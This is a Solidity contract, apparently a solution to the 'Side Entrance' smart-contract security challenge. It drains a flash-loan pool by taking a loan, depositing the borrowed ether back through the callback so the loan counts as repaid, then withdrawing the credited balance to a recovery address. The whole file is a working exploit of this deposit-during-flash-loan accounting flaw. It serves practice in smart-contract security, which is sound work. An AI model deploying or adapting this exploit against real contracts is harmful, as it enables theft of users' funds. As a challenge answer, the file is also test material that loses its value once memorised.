pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

contract Attacker {
    uint256 constant ETHER_IN_POOL = 1000e18;
    SideEntranceLenderPool public pool;
    uint256 public amount;
    address public recovery;

    constructor (   SideEntranceLenderPool _pool, 
                    uint256 _amount, 
                    address _recovery) {
        pool = _pool;
        amount = _amount;
        recovery = _recovery;
    }

    receive() external payable {
    }

    function execute () external payable {
        pool.deposit{value: amount}();
    }

    function attack() public {
        pool.flashLoan(amount);
        pool.withdraw();
        SafeTransferLib.safeTransferETH(recovery, ETHER_IN_POOL);
    }
} 